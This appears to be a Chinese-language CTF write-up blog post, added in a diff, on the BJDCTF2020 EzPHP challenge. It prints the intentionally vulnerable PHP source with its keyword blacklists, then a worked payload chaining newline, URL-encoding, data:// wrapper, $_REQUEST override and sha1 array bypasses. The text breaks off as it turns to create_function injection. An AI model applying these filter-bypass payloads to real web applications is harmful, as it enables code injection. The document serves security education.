@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>BJDCTF2020EzPHP1 - Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/waline.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+ 
+  
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+    <body data-color-scheme="dark">
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        <article class="post">
+    <div class="meta">
+        
+        <div class="date" id="date">
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            <span>December</span>
+            
+            <span>18,</span>
+            <span>2021</span>
+        </div>
+        
+
+        <h2 class="title">BJDCTF2020EzPHP1</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line">This is a very simple challenge <span class="keyword">and</span> <span class="keyword">if</span> you solve it I will give you a flag. Good Luck!</span><br><span class="line">fxck you! I hate English!</span><br></pre></td></tr></table></figure>
+
+<p>1.GET传参：$shana;$passwd</p>
+<p>先来看看PHP手册的介绍</p>
+<blockquote>
+<p>$_SERVER 是九大超全局变量中的一个是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。这也就意味着大量的此类变量都会在<a target="_blank" rel="noopener" href="http://www.faqs.org/rfcs/rfc3875">» CGI 1.1 规范</a>中说明，所以应该仔细研究一下。 </p>
+</blockquote>
+<p>概括一下就是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 的值其实就是获取获取我们url传的值（?后面的所有字符）</p>
+<p>绕过方法很简单对被过滤的字符进行URLencode，由于$_SERVER[‘QUERY_STRING’]不会对获取的值进行URLdecode，绕过成功。</p>
+<p>2.检索字符中进行正则过滤</p>
+<p>先看看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; <span class="comment">//对debu只需要传入aqua_is_cute%0a即可</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>解法：</p>
+<p>%0A绕过</p>
+<p><code>.</code>不会匹配换行符，如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只需要</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$json</span>=<span class="string">&quot;\nflag&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^flag$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只需要传入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=flag%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>
+
+<p>4.</p>
+<p>先看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>超全局变量$_REQUEST</p>
+<blockquote>
+<p>PHP $_REQUEST 用于收集HTML表单提交的数据。</p>
+<p>一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至<form>标签中 action 属性中指定的脚本文件。 若在实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据.</form></p>
+</blockquote>
+<p><img src="/2021/12/18/%5BBJDCTF2020%5DEzPHP%201/buu.png" alt="1"></p>
+<p>匹配超全局变量中的各个表单数据的值，均不可为字母</p>
+<p>这里，本意是想限制我们传入的值不能有字母。但是我们注意到，我们传入都是get请求。<br>我们知道，<code>$_REQUEST</code>接收的请求除了get以为还有psot、cookie等。那么假如我们get传一个a,post也传一个a，那么<code>$_REQUEST[a]</code> 会是谁的值呢？</p>
+<p>这取决于你的php.ini中的<code>variables_order</code>的设置，默认为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variables_order = <span class="string">&quot;GPCS&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里以我的phpstudy中php5.2.17的php.ini配置为例</p>
+<p><img src="/2021/12/18/%5BBJDCTF2020%5DEzPHP%201/variables_order.png" alt="2"></p>
+<p>看看大师傅的解释：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/raobenjun/p/8044337.html">php中的variables_order</a></p>
+<p>PHP中的$_ENV是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它。</p>
+<p>$_ENV只是被动的接受服务器端的环境变量并把它们转换为数组元素，你可以尝试直接输出它。</p>
+<p>当你想看看一个变量中究竟有什么东西在里面时，我所知道的方式有三种：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.var_dump(<span class="variable">$_ENV</span>);</span><br><span class="line"><span class="number">2</span>.print_r(<span class="variable">$_ENV</span>);</span><br><span class="line"><span class="number">3</span>.<span class="keyword">foreach</span>(<span class="variable">$_ENV</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;<span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;--------&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这三种方式中，第一种我觉得最方便而且输出的内容格式清晰。</p>
+<p>由于$ENV变量是取决于服务器的环境变量的，从不同的服务器上获取的$ENV变量打印出的结果可能是完全不同的。所以无法像$SERVER 那样列出完整的列表。以下是$ENV 数组包含的比较通用的元素：</p>
+<p>有时候，$ENV会为空，其原因通常是php的配置文件php.ini的配置项为：variables_order = “GPCS”。要想让$ENV的值不为空，那么variables_order的值应该加上一个大写字母“E”，即：variables_order = “EGPCS”。</p>
+<p>上述配置表示了PHP接受的外部变量来源及顺序，EGPCS是Environment、Get、Post、Cookies、Server的缩写。如果variables_order 的配置中缺少E ，则PHP 无法接受环境变量，那么$_ENV 也就为空了。</p>
+<p>由于开启$ENV，即variables_order = “EGPCS”会导致一些性能损’’失，按php官方的说法是，在生产环境中，不推荐使用。他们更推荐使用getenv (string $varname)函数来获取Environment中的值，而这点需要在编程时就注意到。如果编程时用了$ENV而variables_order中又没有配置为variables_order = “EGPCS”，则程序运行时可能会报错。</p>
+</blockquote>
+<p>也就是说，他先取了get的值然后判断有没有post的值有的话就覆盖掉。那么我们只需要将要get传入的参数post再传一遍即可。</p>
+<h3 id="四、绕过文件内容读取的比较"><a href="#四、绕过文件内容读取的比较" class="headerlink" title="四、绕过文件内容读取的比较"></a>四、绕过文件内容读取的比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];     <span class="comment">// 这里我们把$_GET[&#x27;debug&#x27;] 赋值为aqua_is_cute\n 即可绕过</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>先看关于date伪协议的相关知识</p>
+<blockquote>
+<h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议 "></a>data 伪协议<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13535097.html#2146230942"> </a></h2><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>我们此时可以利用data伪协议，来伪造file文件的内容如:<code>data:,debu_debu_aqua</code></p>
+<h3 id="五、绕过sh1"><a href="#五、绕过sh1" class="headerlink" title="五、绕过sh1"></a>五、绕过sh1</h3><p>先看看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>tip：散列值绕过</strong> <strong>成功后执行</strong></p>
+<p>看看关于sha1的解释</p>
+<blockquote>
+<h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1"></a>sha1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> sha1( <span class="keyword">string</span> <span class="variable">$str</span>[, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span>] )</span><br></pre></td></tr></table></figure>
+
+<p>sha1 — 计算字符串的 sha1 散列值</p>
+<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>返回 sha1 散列值字符串。 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>看看关于extract的解释</p>
+<blockquote>
+<p><strong>extract</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> extract( <span class="keyword">array</span> &amp;<span class="variable">$array</span>[, <span class="keyword">int</span> <span class="variable">$flags</span> = EXTR_OVERWRITE[, <span class="keyword">string</span> <span class="variable">$prefix</span> = <span class="literal">NULL</span>]] )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>array</code></p>
+<p>一个关联数组。此函数会将键名当作变量名，值作为变量的值。对每个键／值对都会在当前的符号表中建立变量，并受到 <code>flags</code> 和 <code>prefix</code> 参数的影响。               </p>
+<p>必须使用关联数组，数字索引的数组将不会产生结果，除非用了**<code>EXTR_PREFIX_ALL</code>** 或**<code>EXTR_PREFIX_INVALID</code>**。 </p>
+</li>
+</ul>
+<p>extract — 从数组中将变量导入到当前的符号表</p>
+<p>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。 </p>
+</blockquote>
+<p>这里的话我们可以直接用传数组来进行绕过,数组间地址的比较永为false</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shana[]=1&amp;passwd[]=2</span><br></pre></td></tr></table></figure>
+
+<p>到目前为止我的playload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line">?debu=aqua_is_cute%0a&amp;file=data:,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</span><br><span class="line">urlencode后:</span><br><span class="line">p?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">debu=&amp;file=</span><br></pre></td></tr></table></figure>
+
+<p>得到的回显是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">red</span>&gt;</span><span class="tag">&lt;<span class="name">B</span>&gt;</span>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!<span class="tag">&lt;/<span class="name">B</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span>Neeeeee! Good Job!<span class="tag">&lt;<span class="name">br</span>&gt;</span>Very good! you know my password. But what is flag?<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span>Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=</span><br></pre></td></tr></table></figure>
+
+<p>这里我们注意到post的时候我们只需要post两个值，我们来看看这里的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里他用的是<code>preg_match</code> 我们的数组可以直接绕过的。</p>
+<h3 id="六、主要考点-create-function-代码注入"><a href="#六、主要考点-create-function-代码注入" class="headerlink" title="六、主要考点:create_function()代码注入"></a>六、主要考点:create_function()代码注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们先介绍一下<code>create_function()</code>函数吧；其实就是匿名函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+
+<p>他有2个参数，第一个$args就是匿名函数传进去的值（实参）而code就是函数的定义代码。其实内部类似这样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们怎么利用呢？我们配合题目的源码来看看：</p>
